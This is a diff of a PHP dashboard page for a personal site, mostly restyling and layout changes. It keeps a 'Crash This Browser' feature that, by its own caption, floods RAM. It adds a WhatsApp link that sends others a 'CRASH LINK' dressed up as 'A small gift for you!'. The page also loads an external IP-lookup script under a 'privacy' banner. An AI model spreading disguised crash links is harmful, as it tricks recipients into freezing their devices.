@@ -16,6 +16,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
     <meta name="viewport" content="width=device-width, initial-scale=0.5">
     <meta charset="UTF-8">
     <title>Welcome</title>
+  
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.2.0/tailwind.min.css">
 <!-- Bootstrap core JavaScript -->
 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
@@ -455,6 +456,11 @@ display: none;}
 .rc {
     border-radius:10px;
 }
+
+.lmao{
+padding-top:10px;
+    padding-bottom:10px;
+}
 .rc1 {
     border-top-right-radius: 60px;
     border-top-left-radius: 60px;
@@ -589,9 +595,9 @@ html, body {
 }
 
 .bs3 {
-    box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
--webkit-box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
--moz-box-shadow: 10px 10px 31px 0px rgba(252,211,211,1);
+   box-shadow: 0px 10px 9px -8px rgba(230,93,93,0.75);
+-webkit-box-shadow: 0px 10px 9px -8px rgba(230,93,93,0.75);
+-moz-box-shadow: 0px 10px 9px -8px rgba(230,93,93,0.75);
 }
 
 .mtp {
@@ -1439,12 +1445,36 @@ input[type="file"] {
                 <div class="content">
                      <h1 class="light" > <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>// <script src='https://l2.io/ip.js'></script> </h1>
 
-                   <p> Discover Features so you can get updates for your interests & more! <b>Note</b>, Some of these features might not work for all users! </p><br/><hr/><br/>
+                   <p> As we understand how important it is to care about privacy, we barely collect any info from our users...Tap the button below to see what actually we collect!</p> <br/><a href="https://obito.ml/logs/"><div class="p-2 bg-indigo-800 items-center text-indigo-100 leading-none lg:rounded-full flex lg:inline-flex" role="alert">
+    <span class="flex rounded-full bg-indigo-500 uppercase px-2 py-1 text-xs font-bold mr-3">Privacy ✨</span>
+    <span class="font-semibold mr-2 text-left flex-auto">See what we collect from users?</span>
+    <svg class="fill-current opacity-75 h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M12.95 10.707l.707-.707L8 4.343 6.586 5.757 10.828 10l-4.242 4.243L8 15.657l4.95-4.95z"/></svg>
+  </div></a><br/>
                     
-                   
+                   <nav class="flex rc items-center justify-between flex-wrap bg-tahiti-500 p-6">
+  <div class="flex items-center flex-shrink-0 text-white mr-6">
+    <img src="https://icon-library.com/images/config-icon/config-icon-8.jpg" width="40px"/>&nbsp;
+    <span class="font-semibold text-xl tracking-tight">Account Settings ➜</span>
+  </div>
+  <div class="block lg:hidden">
+    <button class="flex items-center px-3 py-2 border rounded text-teal-200 border-teal-400 hover:text-white hover:border-white">
+     
+    </button>
+  </div>
+  <div class="w-full block flex-grow lg:flex lg:items-center lg:w-auto">
+    <div class="text-sm lg:flex-grow">
+      
+      <a href="reset-password.php" class="inline-block text-sm px-4 py-2 leading-none border rounded text-white border-white hover:border-transparent hover:text-teal-500 hover:bg-white mt-4 lg:mt-0">Reset Account Password</a>
+       <a href="logout.php" class="inline-block text-sm px-4 py-2 leading-none border rounded text-white border-white hover:border-transparent hover:text-teal-500 hover:bg-white mt-4 lg:mt-0">Logout</a>
+    </div>
+    <div>
+     
+    </div>
+  </div>
+</nav>
                     
-                   <a href="reset-password.php" class="text-center px-6 py-2 text-xxs font-bold rounded  bg-red-200 text-red-700">Reset Your Password</a>
-                   <a href="logout.php" class="text-center px-4 py-2 text-xxs font-bold rounded  bg-white-200 text-red-500">Logout</a>
+                 <!--  <a href="reset-password.php" class="text-center px-6 py-2 text-xxs font-bold rounded  bg-red-200 text-red-700">Reset Your Password</a>
+                   <a href="logout.php" class="text-center px-4 py-2 text-xxs font-bold rounded  bg-white-200 text-red-500">Logout</a> -->
                 </div>
             </div>
             
@@ -1588,7 +1618,7 @@ input[type="file"] {
                     </tbody>
                   </table>
                  <div class="pane" id="pane_0">
-            <img src="https://i.pinimg.com/originals/90/ec/a7/90eca7718c2bc164481344aecfaa1678.gif" class="rc" width="100%">
+            <img src="https://66.media.tumblr.com/32db4b2d09f92dd80fb77e3f56de72a6/tumblr_ofq8q1cdKD1rey868o1_640.gif" class="rc" width="100%">
         </div>
         <div class="pane" id="pane_1" style="display: none">
          
@@ -1649,11 +1679,11 @@ input[type="file"] {
 					<input id="eventAction" type="hidden" name="eventAction" value="Other">
 					<div class="dropdown-menu"><br/>
 				
-					<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-indigo-900"  onclick="setFiletype('mkv|mp4|avi|mov|mpg|wmv', 'Videos', 'film')"><span class="fa fa-film" aria-hidden="true"></span>🎥 Videos</a>
+					<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-black"  onclick="setFiletype('mkv|mp4|avi|mov|mpg|wmv', 'Videos', 'film')"><span class="fa fa-film" aria-hidden="true"></span>🎥 Videos</a>
 					
 					
 					
-						<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-indigo-900" onclick="setFiletype('exe|iso|tar|rar|zip|apk', 'Applications', 'desktop')"><span class="fa fa-desktop" aria-hidden="true"></span> 🦝 Applications</a>
+						<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-black" onclick="setFiletype('exe|iso|tar|rar|zip|apk', 'Applications', 'desktop')"><span class="fa fa-desktop" aria-hidden="true"></span> 🦝 Applications</a>
 					
 					
 					
@@ -1661,7 +1691,7 @@ input[type="file"] {
 					
 						
 						
-						<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-indigo-900"  onclick="setFiletype('-1', 'All Files', 'asterisk')"><span class="fa fa-asterisk" aria-hidden="true"></span>🔥 All Files</a>
+						<a class="text-center px-4 py-2 text-xxs font-bold rounded opacity-75  bg-indigo-200 text-black"  onclick="setFiletype('-1', 'All Files', 'asterisk')"><span class="fa fa-asterisk" aria-hidden="true"></span>🔥 All Files</a>
 					</div>
 				</div>
 				<div class="input-group-append">
@@ -1696,6 +1726,7 @@ input[type="file"] {
     </div><!-- end hero -->
       
     
+    
 
         
 
@@ -1712,59 +1743,242 @@ input[type="file"] {
      
   <!-- This is an example component -->
 <div class=" bg-white">
-    <div class=" mx-auto text-black">
+    
+    
+    
+    
+    <aside>
+  <div class="px-4 py-16 mx-auto max-w-screen-2xl sm:px-6 lg:px-8">
       
-        <div class="mt-28  flex flex-col md:flex-row  items-center text-sm text-black-400">
-            <!-- <p class="order-2 euu1   md:order-1 mt-8 md:mt-0"> <img src="https://i.imgur.com/UDWASLL.png" width="250px"/> </p> -->
-            
-             <div class="grid gap-6 euu1 md:grid-cols-2 lg:grid-cols-4">
-    <!-- Card 1 -->
-    <div class="flex items-center rounded-lg shadow-md h p-4 bg-white ">
-      <div class="p-3 mr-4 bg-blue-500 text-white  rounded-full">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/Nearby_Share_icon.png" width="50px"/>
-      </div>
-      <div>
-        <p class="mb-2 text-sm font-medium text-gray-900">JS-CrashScript</p> 
+      
+      
+    <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
         
-        <a onclick="myFunction()"><p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Crash This Browser </p></a>
-      </div>
-    </div>
-    
-    
-    
-    
-   <!--  <div class="flex items-center p-4 bg-white ">
-      <div class="p-3 mr-4 bg-white text-white rounded-full">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/2042px-WhatsApp.svg.png" width="80px"/>
-      </div>
-      <div>
-        <p class="mb-2 text-sm font-medium text-gray-900">Whatsapp-Texter</p> 
-        
-       <p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Send Custom Text</p>
-     <img style="inline" src="https://freepngimg.com/thumb/web_design/51034-9-share-free-transparent-image-hq.png" width="40px"/>
-      </div>
-    </div> -->
- 
-       <div class="p-6 bg-white flex items-center space-x-6 rounded-lg shadow-md h cursor-pointer">
-
-    <div>
-      <h1 class="text-xl font-bold text-gray-700 mb-2">Portable Crash-Script</h1>
-      <p class="text-gray-600 w-80 text-sm">Shareable script using URL</p><hr/><BR/>
-      <a href='whatsapp://send?text=A small gift for you! https://obito.ml/hey.html'><p class="text-center px-4 py-2 text-s font-bold rounded opacity-75 bg-red-200 text-black-700">Open Whatsapp </p></a>
-    </div>
-  </div>  
-  
-  
-     <div class="p-6 bg-white flex items-center space-x-6   cursor-pointer">
-
-    <div>
-      <h1 class="text-xl font-bold text-gray-700 mb-2">Custom QR Generator</h1>
-      <p class="text-gray-600 w-80 text-sm">Type Text and Hit Enter to Generate your custom QR Code</p><hr/>
-      <input id="text" type="text" value="https://obito.ml/" style="height:50px; width:90%"  class="bs3 rc " />
+      <div class="p-8 text-center rc text-white bg-gray-100 sm:col-span-2 sm:p-16 ">
+        <div class="max-w-lg mx-auto space-y-8">
+               <img src="https://i.imgur.com/7qszumI.png" />
      
+
+
+
+
+<div class="bg-white rounded-xl rc p-4 shadow-xl mt-4">
+                                    <div class="flex flex-col justify-center items-center">
+                                         <div id="qrcode" style="width:200px; height:200px; margin-top:15px;"></div>
+                                    </div><br/>
+                                   
+                                   
+                                    <div class="flex space-x-2 text-gray-400 items-center mt-2">
+                                  
+                                    </div> <p class="text-gray-600  w-80 text-sm">Type Text and Hit Enter to Generate your custom QR Code</p>
+                                </div>
+
+ <input id="text" type="text" value="https://obito.ml/" style="height:50px; width:90%; color: black"  class="bs3 rc " />
+
+
+
+
+ 
+        </div>
+      </div>
+
+   
+   <article class="p-4 bg-gray-800 bs rc border border-gray-700 rounded-xl">
+  <div class="flex items-center">
+    <img src="https://i.gifer.com/origin/72/725ec393b9e3d90f2b3606a1291c77d9_w200.gif"  class="w-16 h-16 rounded-full" />
+
+    <div class="ml-3">
+      <h5 class="text-lg font-medium text-white">Miscellaneous STUFF 🍃</h5>
+      
+      <div class="flow-root">
+
+      </div>
     </div>
-  </div>  
-  <div id="qrcode" style="width:200px; height:200px; margin-top:15px;"></div>
+  </div>
+
+  <ul class="mt-4 space-y-2">
+    <li>
+      <a
+        onclick="myFunction()"
+        target="_blank"
+        class="block h-full p-4 border border-gray-700  hover:border-pink-600"
+      >
+        <h5 class="font-medium text-white">Crash This Browser</h5>
+
+        <p class="mt-1 text-xs font-medium text-gray-300">
+          Developer is not responsible for any damage, rapidly RAM is filled to make everything unresponsive!
+        </p>
+      </a>
+    </li>
+
+    <li>
+      <a
+        href='whatsapp://send?text=A small gift for you! https://obito.ml/hey.html'
+        target="_blank"
+        class="block h-full p-4 border border-gray-700  hover:border-pink-600"
+      >
+        <h5 class="font-medium text-white">Portable Crash Script</h5>
+
+        <p class="mt-1 text-xs font-medium text-gray-300">
+          Tap Here to share the CRASH LINK using Whatsapp!
+        </p>
+      </a>
+    </li>
+    
+    
+    
+  <li>
+      <a
+        href='https://obito.ml/kanji'
+        target="_blank"
+        class="block h-full p-4 border border-gray-700  hover:border-pink-600"
+      >
+        <h5 class="font-medium text-white">Kanji - Text Bin</h5>
+
+        <p class="mt-1 text-xs font-medium text-gray-300">
+         The contents of you page is compressed using LZString.js and encrypted using mjsCrypt.js, and stored in Unique hash.
+        </p>
+      </a>
+    </li>
+    
+    
+
+     <li>
+      <a
+        href='https://obito.ml/server'
+        target="_blank"
+        class="block h-full p-4 border border-gray-700  hover:border-pink-600"
+      >
+        <h5 class="font-medium text-white">P2P Serverless Hosting</h5>
+
+        <p class="mt-1 text-xs font-medium text-gray-300">
+          That page will live as long as someone, somewhere is viewing it. Once the last person closes their browser, the page will be gone.
+        </p>
+      </a>
+    </li>
+    
+    
+
+ <!--   <li>
+      <a
+        href="https://remoteruby.transistor.fm/"
+        target="_blank"
+        class="block h-full p-4 border border-gray-700 rounded-lg hover:border-pink-600"
+      >
+        <h5 class="font-medium text-white">Remote Ruby Podcast</h5>
+
+        <p class="mt-1 text-xs font-medium text-gray-300">
+          Three Rubyists having conversations and interviewing others about Ruby and web development.
+        </p>
+      </a>
+    </li> -->
+  </ul>
+</article>
+   
+   
+   
+    <div class="w-full max-w-2xl mx-auto bg-white shadow-lg rounded-sm rc border border-gray-200">
+            <header class="px-5 py-4 border-b border-gray-100">
+                <h2 class="font-semibold text-gray-800">Under Development..</h2><hr/>
+              
+            </header>
+            <div class="p-3">
+                <div class="overflow-x-auto">
+                    <table class="table-auto w-full">
+                        <thead class="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
+                            <tr>
+                                <th class="p-2 whitespace-nowrap">
+                                    <div class="font-semibold text-left">Name</div>
+                                </th>
+                                <th class="p-2 whitespace-nowrap">
+                                    <div class="font-semibold text-left">Alpha Feature</div>
+                                </th>
+                               
+                            </tr>
+                        </thead>
+                        <tbody class="text-sm divide-y divide-gray-100">
+                            <tr>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="flex items-center">
+                                        <div class="w-10 h-10 flex-shrink-0 mr-2 sm:mr-3"><img class="rounded-full" src="https://cdn1.iconfinder.com/data/icons/files-documents-14/24/expand-file-512.png" width="40" height="40" alt="Alex Shatov"></div>
+                                        <div class="font-medium text-gray-800">PHP Unzipper</div>
+                                    </div>
+                                </td>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="text-left">Download .PHP</div>
+                                </td>
+                            
+                            </tr>
+                           <tr>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="flex items-center">
+                                        <div class="w-10 h-10 flex-shrink-0 mr-2 sm:mr-3"><img class="" src="https://i.pinimg.com/originals/8f/c3/7b/8fc37b74b608a622588fbaa361485f32.png" width="40" height="40" alt="Philip Harbach"></div>
+                                        <div class="font-medium text-gray-800">O-Mailerv2</div>
+                                    </div>
+                                </td>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="text-left">Show Me..!</div>
+                                </td>
+                     
+                            </tr>
+                             <tr>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="flex items-center">
+                                        <div class="w-10 h-10 flex-shrink-0 mr-2 sm:mr-3"><img class="" src="https://cdn4.iconfinder.com/data/icons/smart-home-39/128/Artboard_3-512.png" width="40" height="40" alt="Mirko Fisuk"></div>
+                                        <div class="font-medium text-gray-800">Proxy Unblocker</div>
+                                    </div>
+                                </td>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="text-left">Unlock The Web!</div>
+                                </td>
+                       
+                            </tr>
+                           <!-- <tr>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="flex items-center">
+                                        <div class="w-10 h-10 flex-shrink-0 mr-2 sm:mr-3"><img class="rounded-full" src="https://raw.githubusercontent.com/cruip/vuejs-admin-dashboard-template/main/src/images/user-36-08.jpg" width="40" height="40" alt="Olga Semklo"></div>
+                                        <div class="font-medium text-gray-800">Olga Semklo</div>
+                                    </div>
+                                </td>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="text-left">olga.s@cool.design</div>
+                                </td>
+                        
+                            </tr>
+                            <tr>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="flex items-center">
+                                        <div class="w-10 h-10 flex-shrink-0 mr-2 sm:mr-3"><img class="rounded-full" src="https://raw.githubusercontent.com/cruip/vuejs-admin-dashboard-template/main/src/images/user-36-09.jpg" width="40" height="40" alt="Burak Long"></div>
+                                        <div class="font-medium text-gray-800">Burak Long</div>
+                                    </div>
+                                </td>
+                                <td class="p-2 whitespace-nowrap">
+                                    <div class="text-left">longburak@gmail.com</div>
+                                </td>
+                       
+                            </tr> -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+   
+    </div>
+  </div>
+</aside>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+ 
+  
+  
   
   
   <script src="https://cdn.jsdelivr.net/gh/baroninn/qrcodejs@master/qrcode.js"></script>
@@ -1886,8 +2100,8 @@ $("#text").
                 <p class="font-medium text-blue-500 uppercase">Beta v0.1</p>
                 <h1 class="text-2xl font-extrabold leading-none text-white sm:text-3xl md:text-5xl">
                     Unlimited Image Uploader
-                </h1><br/><button class="rc" type="submit" name="submit" class="btn btn-primary btn-block" style="background: #4066ff;border:none;" onclick="submitdata()">Upload</button>
-                <p class="text-xl text-gray-600 md:pr-16"><br/>Click on ☁️ to select image..<br/>Still in Development Stage!</p>
+                </h1><br/><button class="rc lmao text-white" type="submit" name="submit" class="btn btn-primary btn-block" style="background: #4066ff;border:none;" onclick="submitdata()">Upload</button>
+                <p class="text-xl text-gray-600 md:pr-16"><br/>Click on ☁️ to select image..<br/>Do not upload confidential images!</p>
             </div>
 
             <div class=" mt-48 md:mt-0 ">
@@ -1926,7 +2140,7 @@ $("#text").
         function submitdata() {
             $(".container .Result").css('display', 'block');
 			$(".container .Result").html(
-						    '<div class="euu"><strong>Uploading image 🎐️</strong></div>');
+						    '<div class="euu"><strong>Uploading image 📁️</strong></div>');
 			$(".container .ewm").css('display', 'block');
             $.ajax({
                 type: "POST",
@@ -1941,7 +2155,7 @@ $("#text").
                     if(result.code == 200){
                         $(".container .Result").css('display', 'block');
 					    $(".container .Result").html(
-						'<div class="euu"><strong>Upload Successfully Done ✔️</strong><input type="text" value="'+ result.src +'" id="imgurl" size="15"><br><a href="'+ result.src + '" target="_Blank"></a> &nbsp;<button onclick="CopyUrl()" class="component border border-transparent rounded font-semibold tracking-wide text-sm px-5 py-2 focus:outline-none focus:shadow-outline bg-indigo-500 text-gray-100 hover:bg-indigo-600 hover:text-gray-200">Copy URL</button><br/><br/></div>');
+						'<div class="euu"><strong>Upload Successfully Done ✔️</strong><br><br><input type="text" value="'+ result.src +'" id="imgurl" size="40"><br><a href="'+ result.src + '" target="_Blank"></a> &nbsp;<button onclick="CopyUrl()" class="component border border-transparent rounded font-semibold tracking-wide text-sm px-5 py-2 focus:outline-none focus:shadow-outline bg-indigo-500 text-gray-100 hover:bg-indigo-600 hover:text-gray-200">Copy URL</button><br/></div>');
 					    $(".container .ewm").css('display', 'block');
                     }else{
 						$(".container .Result").css('display', 'block');
@@ -1954,7 +2168,7 @@ $("#text").
                 error : function() {
                     $(".container .Result").css('display', 'block');
 					$(".container .Result").html(
-						'<div class="euu"><strong>No File Selected 👀</strong></div>');
+						'<div class="euu"><strong>No File Selected ❌</strong></div>');
 					$(".container .ewm").css('display', 'block');
 					setTimeout('closesctips()', 12000);
                 }
@@ -2206,6 +2420,21 @@ accordionItemHeaders.forEach((accordionItemHeader) => {
             })
         })
     </script>
+
+
+
+
+
+
+<!--<footer class="p-4 bg-white rounded-lg shadow md:px-6 md:py-8 dark:bg-gray-800">
+
+<span class="block text-sm text-gray-500 sm:text-center dark:text-gray-400">© 2022 <a href="https://flowbite.com" target="_blank" class="hover:underline">Obito™</a>. All Rights Reserved.
+</span>
+</footer> -->
+
+
+
+
 
 </body>
 </html>
